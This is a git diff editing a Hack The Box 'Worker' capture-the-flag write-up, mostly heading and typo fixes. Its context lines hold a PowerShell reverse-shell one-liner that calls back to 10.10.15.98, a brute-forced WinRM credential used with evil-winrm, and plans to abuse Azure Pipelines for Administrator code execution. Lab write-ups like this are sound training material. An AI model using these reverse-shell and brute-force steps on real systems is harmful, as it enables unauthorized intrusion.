@@ -386,7 +386,7 @@ Under SmartHotel360 there was a mostly empty project called `w45ty45t`.
 
 In all, found 3 usernames, and a possible password `w45ty45t`
 
-## Initial Foothold
+## The Azure DevOps Repository
 
 None of the usernames or potential passwords got me anywhere, so I began to look closer at what I was able to do in the `SmartHotel360` repository.
 
@@ -457,6 +457,8 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.15.98",8099);$stream = 
 
 My powershell script consisted of a reverse shell one-liner found on [https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3\#gistcomment-3391254](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3#gistcomment-3391254)
 
+## Initial Foothold
+
 ```text
 ┌──(zweilos㉿kali)-[~/htb/worker]
 └─$ script                                                                                          1 ⨯
@@ -508,14 +510,16 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 PS C:\windows\system32\inetsrv>
 ```
 
-SeImpersonatePrivilege is interesting
+I was able to get a reverse shell after uploading and running my PowerShell script!
+
+I was logged in as the service account `iis apppool\defaultapppool`.  SeImpersonatePrivilege sounded interesting
 
 ## Road to User
 
 ### Further enumeration
 
 ```text
-PS C:\users\restorer> net user
+PS C:\windows\system32\inetsrv> net user
 
 User accounts for \\
 
@@ -929,6 +933,8 @@ used winrm-brute to
 [SUCCESS] user: robisl password: wolves11
 ```
 
+Retrieved the password for one of the users
+
 ```text
 ┌──(zweilos㉿kali)-[~/htb/worker/winrm-brute]
 └─$ evil-winrm -u robisl -p wolves11 -i 10.10.10.203                                      
@@ -1000,9 +1006,9 @@ On the user's desktop I found the `user.txt` flag
 
 After searching high and low, and enumerating as much as I could, I didn't find anything useful.
 
-pic
+![](../../.gitbook/assets/13-sign-inas-fail%20%281%29.png)
 
-I tried switching users in the `devops` page I had open, and received an errormoessage. I decided to try `robisl`'s credentials on a fresh `deveops` page after closing it, and was logged in to a different project
+I tried switching users in the `devops` page I had open, and received an error message. I decided to try `robisl`'s credentials on a fresh `deveops` page after closing it, and was logged in to a different project
 
 [https://azure.microsoft.com/en-us/services/devops/](https://azure.microsoft.com/en-us/services/devops/)
 
@@ -1010,7 +1016,7 @@ I tried switching users in the `devops` page I had open, and received an errormo
 
 > Azure Pipelines provides a quick, easy, and safe way to automate building your projects and making them available to users.
 
-This sounds like an easy way to get code execution...I wonder if there is a way to run it in th context of `Administrator`?
+This sounds like an easy way to get code execution...I wonder if there is a way to run it in the context of `Administrator`?
 
 New Pipeline - Azure Repos Git - PartsUnlimited - Starter Pipeline
 
